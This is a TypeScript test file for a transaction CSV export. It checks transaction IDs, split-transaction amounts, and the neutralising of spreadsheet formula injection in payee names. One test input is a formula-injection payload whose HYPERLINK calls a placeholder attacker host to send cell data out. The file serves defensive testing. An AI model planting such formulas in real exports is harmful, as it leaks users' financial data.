import { parse as csvParse } from 'csv-parse/sync';

import * as db from '#server/db';
import { loadMappings } from '#server/db/mappings';
import { q } from '#shared/query';

import { exportQueryToCSV, exportToCSV } from './export-to-csv';

describe('exportToCSV', () => {
  const accounts = [{ id: 'a1', name: 'Checking' }];
  const categoryGroups = [
    { name: 'Income', categories: [{ id: 'c1', name: 'Salary' }] },
  ];

  function makeTransaction(overrides: Record<string, unknown> = {}) {
    return {
      account: 'a1',
      date: '2026-01-01',
      payee: 'p1',
      notes: '',
      category: 'c1',
      amount: 10000,
      cleared: false,
      reconciled: false,
      ...overrides,
    };
  }

  async function payeeCell(payeeName: string, amount = 10000) {
    const csv = await exportToCSV(
      [makeTransaction({ amount })],
      accounts,
      categoryGroups,
      [{ id: 'p1', name: payeeName }],
    );
    const rows = csvParse(csv, { columns: true }) as Array<
      Record<string, string>
    >;
    return { row: rows[0], csv };
  }

  it('exports the original transaction ID', async () => {
    const id = 'b9628997-cf7d-49f6-920d-89f6b87c1a9a';
    const csv = await exportToCSV(
      [makeTransaction({ id })],
      accounts,
      categoryGroups,
      [{ id: 'p1', name: 'Acme' }],
    );
    const rows = csvParse(csv, { columns: true }) as Array<
      Record<string, string>
    >;
    expect(rows[0]['Transaction ID']).toBe(id);
    expect(rows[0].Amount).toBe('100');
  });

  it.each([
    ['=HYPERLINK("http://attacker/?d="&B2,"x")'],
    ['=1+1'],
    ['+1+1'],
    ['-2+3'],
    ['@SUM(1+1)'],
    ['\tHELLO'],
    ['\rHELLO'],
  ])('prefixes a payee starting with %j with a single quote', async payload => {
    const { row } = await payeeCell(payload);
    expect(row.Payee).toBe("'" + payload);
  });

  it('does not prefix payees without a leading trigger character', async () => {
    const { row } = await payeeCell('Acme Corp');
    expect(row.Payee).toBe('Acme Corp');
  });

  it('does not prefix negative numeric amounts', async () => {
    const { row } = await payeeCell('Acme', -2500);
    expect(row.Amount).toBe('-25');
  });
});

describe('exportQueryToCSV', () => {
  beforeEach(async () => {
    await global.emptyDatabase()();
    await loadMappings();
    await db.insertAccount({ id: 'a1', name: 'Checking' });
  });

  it('exports distinct IDs for ordinary, parent, and split-child transactions', async () => {
    const transactions = [
      { id: 'ordinary', amount: 10000 },
      { id: 'parent', amount: -2500, is_parent: true },
      { id: 'child', amount: -2500, is_child: true, parent_id: 'parent' },
    ];
    for (const transaction of transactions) {
      await db.insertTransaction({
        account: 'a1',
        date: '2026-01-01',
        cleared: false,
        ...transaction,
      });
    }
    const csv = await exportQueryToCSV(q('transactions'));
    const rows = csvParse(csv, { columns: true }) as Array<
      Record<string, string>
    >;
    expect(rows.map(row => row['Transaction ID']).sort()).toEqual([
      'child',
      'ordinary',
      'parent',
    ]);
    const parent = rows.find(row => row['Transaction ID'] === 'parent');
    expect(parent?.Amount).toBe('0');
    expect(parent?.Split_Amount).toBe('-25');
    expect(parent?.Notes).toBe('(SPLIT INTO 1) ');
  });
});
